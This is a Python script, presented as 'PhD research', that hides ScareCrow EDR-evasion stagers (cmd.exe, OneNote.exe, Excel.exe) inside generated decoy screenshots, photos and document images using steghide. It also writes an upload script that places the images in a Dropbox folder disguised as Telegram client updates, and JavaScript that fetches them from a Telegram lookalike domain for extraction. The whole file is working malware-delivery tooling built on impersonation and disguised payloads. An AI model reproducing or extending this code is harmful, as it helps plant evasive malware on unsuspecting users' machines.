#!/usr/bin/env python3
"""
Steganography System for PhD Research
Embeds and extracts payloads from images for delivery
"""

import os
import sys
import base64
import hashlib
import subprocess
import random
import json
from pathlib import Path
from PIL import Image, ImageEnhance
import numpy as np

class StegoSystem:
    def __init__(self, password="telegram2025research"):
        self.password = password
        self.base_dir = Path(__file__).parent
        self.images_dir = self.base_dir / "stego-images"
        self.payloads_dir = self.base_dir / "payloads"
        self.output_dir = self.base_dir / "stego-output"
        
        # Create directories
        for d in [self.images_dir, self.payloads_dir, self.output_dir]:
            d.mkdir(exist_ok=True)

    def create_carrier_images(self, count=50):
        """Create legitimate-looking images as carriers"""
        print(f"Creating {count} carrier images...")
        
        # Generate various types of images
        for i in range(count):
            if i < 20:
                # Create "screenshot" style images
                self._create_screenshot_image(i)
            elif i < 35:
                # Create "photo" style images
                self._create_photo_image(i)
            else:
                # Create "document" style images
                self._create_document_image(i)
        
        print(f"Created {count} carrier images in {self.images_dir}")

    def _create_screenshot_image(self, index):
        """Create fake screenshot image"""
        width, height = 1920, 1080
        img = Image.new('RGB', (width, height), color='white')
        
        # Add some fake UI elements
        pixels = np.array(img)
        
        # Random noise that looks like UI
        for _ in range(100):
            x = random.randint(0, width-200)
            y = random.randint(0, height-50)
            w = random.randint(50, 200)
            h = random.randint(20, 50)
            color = (random.randint(200, 255), random.randint(200, 255), random.randint(200, 255))
            pixels[y:y+h, x:x+w] = color
        
        img = Image.fromarray(pixels)
        img.save(self.images_dir / f"screenshot_{index:03d}.png")

    def _create_photo_image(self, index):
        """Create fake photo image"""
        width, height = 1600, 1200
        
        # Generate random landscape-like image
        pixels = np.random.randint(0, 256, (height, width, 3), dtype=np.uint8)
        
        # Add some structure
        for y in range(height):
            for x in range(width):
                # Sky gradient
                if y < height // 3:
                    pixels[y, x] = [100 + y//10, 150 + y//10, 200 + y//10]
                # Ground
                else:
                    pixels[y, x] = [50 + random.randint(-20, 20), 
                                   100 + random.randint(-20, 20), 
                                   30 + random.randint(-20, 20)]
        
        img = Image.fromarray(pixels)
        img.save(self.images_dir / f"photo_{index:03d}.jpg", quality=95)

    def _create_document_image(self, index):
        """Create fake document image"""
        width, height = 2480, 3508  # A4 at 300 DPI
        img = Image.new('RGB', (width, height), color='white')
        
        pixels = np.array(img)
        
        # Add text-like lines
        for line in range(0, height-100, 40):
            for char_pos in range(100, width-100, 20):
                if random.random() > 0.1:  # 90% chance of "character"
                    pixels[line:line+20, char_pos:char_pos+15] = [0, 0, 0]
        
        img = Image.fromarray(pixels)
        img.save(self.images_dir / f"document_{index:03d}.png")

    def embed_payload(self, payload_path, image_path, output_path):
        """Embed payload into image using steghide"""
        try:
            cmd = [
                'steghide', 'embed',
                '-cf', str(image_path),
                '-ef', str(payload_path),
                '-sf', str(output_path),
                '-p', self.password,
                '-z', '9',  # Maximum compression
                '-e', 'des'  # Encryption algorithm
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return True, "Embedded successfully"
            else:
                return False, result.stderr
        except Exception as e:
            return False, str(e)

    def extract_payload(self, stego_image_path, output_path):
        """Extract payload from stego image"""
        try:
            cmd = [
                'steghide', 'extract',
                '-sf', str(stego_image_path),
                '-xf', str(output_path),
                '-p', self.password,
                '-f'  # Force overwrite
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return True, "Extracted successfully"
            else:
                return False, result.stderr
        except Exception as e:
            return False, str(e)

    def process_stagers(self):
        """Process all ScareCrow stagers into stego images"""
        stager_paths = [
            "/home/kali/tools/ScareCrow/cmd.exe",
            "/home/kali/tools/ScareCrow/OneNote.exe", 
            "/home/kali/tools/ScareCrow/Excel.exe"
        ]
        
        print("Processing stagers into steganography images...")
        
        # Get list of carrier images
        carrier_images = list(self.images_dir.glob("*.png")) + list(self.images_dir.glob("*.jpg"))
        
        if not carrier_images:
            print("No carrier images found. Creating them...")
            self.create_carrier_images(50)
            carrier_images = list(self.images_dir.glob("*.png")) + list(self.images_dir.glob("*.jpg"))
        
        stego_manifest = {}
        
        for i, stager_path in enumerate(stager_paths):
            if not os.path.exists(stager_path):
                print(f"Stager not found: {stager_path}")
                continue
            
            # Select multiple carrier images for each stager (redundancy)
            selected_carriers = random.sample(carrier_images, min(5, len(carrier_images)))
            
            stager_name = Path(stager_path).stem
            stego_manifest[stager_name] = []
            
            for j, carrier in enumerate(selected_carriers):
                output_name = f"{stager_name}_{j:02d}.png"
                output_path = self.output_dir / output_name
                
                success, message = self.embed_payload(stager_path, carrier, output_path)
                
                if success:
                    # Calculate hash for verification
                    with open(output_path, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()
                    
                    stego_manifest[stager_name].append({
                        'filename': output_name,
                        'carrier': carrier.name,
                        'hash': file_hash,
                        'size': os.path.getsize(output_path)
                    })
                    print(f"✓ Created: {output_name}")
                else:
                    print(f"✗ Failed: {output_name} - {message}")
        
        # Save manifest
        manifest_path = self.output_dir / "stego_manifest.json"
        with open(manifest_path, 'w') as f:
            json.dump(stego_manifest, f, indent=2)
        
        print(f"\nManifest saved to: {manifest_path}")
        return stego_manifest

    def generate_extraction_script(self):
        """Generate JavaScript for client-side extraction"""
        js_code = '''
// Steganography extraction system
class StegoExtractor {
    constructor() {
        this.password = "telegram2025research";
        this.baseUrl = "https://telegrams.app/images/";
    }

    async downloadAndExtract(filename) {
        try {
            // Download stego image
            const response = await fetch(this.baseUrl + filename);
            if (!response.ok) throw new Error('Download failed');
            
            const blob = await response.blob();
            
            // Convert to data URL for processing
            const reader = new FileReader();
            reader.onload = () => {
                this.extractFromDataUrl(reader.result);
            };
            reader.readAsDataURL(blob);
            
        } catch (error) {
            console.error('Extraction failed:', error);
        }
    }

    extractFromDataUrl(dataUrl) {
        // This would normally use steghide-equivalent in JS
        // For now, redirect to backend extraction endpoint
        const extractUrl = `/extract?image=${encodeURIComponent(dataUrl)}&pwd=${this.password}`;
        window.location.href = extractUrl;
    }

    async extractMultiple(filenames) {
        for (const filename of filenames) {
            try {
                await this.downloadAndExtract(filename);
                break; // Success, stop trying others
            } catch (error) {
                continue; // Try next image
            }
        }
    }
}

// Usage
const extractor = new StegoExtractor();
extractor.extractMultiple([
    "cmd_00.png",
    "cmd_01.png", 
    "cmd_02.png"
]);
'''
        
        js_path = self.output_dir / "stego_extractor.js"
        with open(js_path, 'w') as f:
            f.write(js_code)
        
        print(f"JavaScript extractor saved to: {js_path}")

    def upload_to_dropbox(self):
        """Create script to upload stego images to Dropbox"""
        upload_script = '''#!/bin/bash
# Upload steganography images to Dropbox

DROPBOX_DIR="$HOME/Dropbox/Apps/TelegramClientUpdates/Images"
STEGO_DIR="/home/kali/Cloudflare/stego-output"

# Create Dropbox directory
mkdir -p "$DROPBOX_DIR"

# Copy all stego images
echo "Uploading steganography images to Dropbox..."
cp "$STEGO_DIR"/*.png "$DROPBOX_DIR"/
cp "$STEGO_DIR"/*.jpg "$DROPBOX_DIR"/ 2>/dev/null || true

# Generate index file
cat > "$DROPBOX_DIR/index.json" << 'EOF'
{
  "images": [
'''
        
        # Add all output images to script
        stego_images = list(self.output_dir.glob("*.png")) + list(self.output_dir.glob("*.jpg"))
        for i, img in enumerate(stego_images):
            upload_script += f'    "{img.name}"'
            if i < len(stego_images) - 1:
                upload_script += ','
            upload_script += '\n'
        
        upload_script += '''  ],
  "timestamp": "''' + str(int(os.time.time())) + '''",
  "count": ''' + str(len(stego_images)) + '''
}
EOF

echo "Upload completed. Images available in Dropbox."
'''
        
        script_path = self.output_dir / "upload_to_dropbox.sh"
        with open(script_path, 'w') as f:
            f.write(upload_script)
        
        os.chmod(script_path, 0o755)
        print(f"Upload script created: {script_path}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 stego-system.py [create|embed|extract|process]")
        return
    
    stego = StegoSystem()
    command = sys.argv[1]
    
    if command == "create":
        stego.create_carrier_images(50)
    elif command == "process":
        stego.process_stagers()
        stego.generate_extraction_script()
        stego.upload_to_dropbox()
    elif command == "embed" and len(sys.argv) == 5:
        payload, image, output = sys.argv[2:5]
        success, msg = stego.embed_payload(payload, image, output)
        print(f"{'Success' if success else 'Failed'}: {msg}")
    elif command == "extract" and len(sys.argv) == 4:
        stego_image, output = sys.argv[2:4]
        success, msg = stego.extract_payload(stego_image, output)
        print(f"{'Success' if success else 'Failed'}: {msg}")
    else:
        print("Invalid command or arguments")

if __name__ == "__main__":
    main()